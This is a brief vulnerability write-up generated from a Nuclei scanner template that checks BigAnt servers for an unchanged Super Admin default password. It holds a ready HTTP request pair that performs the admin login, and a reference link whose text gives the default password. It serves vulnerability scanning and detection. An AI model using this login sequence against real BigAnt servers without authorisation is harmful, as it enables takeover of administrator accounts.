# Nuclei Template: BigAnt - Default Password
**Template ID:** bigant-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** Critical
**CWE:** CWE-522
**Source:** Nuclei Template (`bigant-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Misconfiguratoin leads to Default Login into BigAnt Super Admin Account.

## Steps to reproduce / Exploit Payload
```http
GET /index.php/Home/login/index.html HTTP/1.1
Host: {{Hostname}}

POST /index.php/Home/Login/login_post.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

saas=default&account={{username}}&password={{base64(password)}}&to=admin&app=&__hash__={{hash}}&__hash__={{hash}}&submit=
```

## References
- https://www.bigantsoft.com/support/faq/2-4_How_to_switch_login_accounts_System_admin_Security_admin_Audit_admin_super_admin.html#:~:text=How%2Dto-,How%20to%20switch%20login%20accounts%3A%20System%20admin%2FSecurity%20admin%2F,password%20is%20123456%20by%20default.
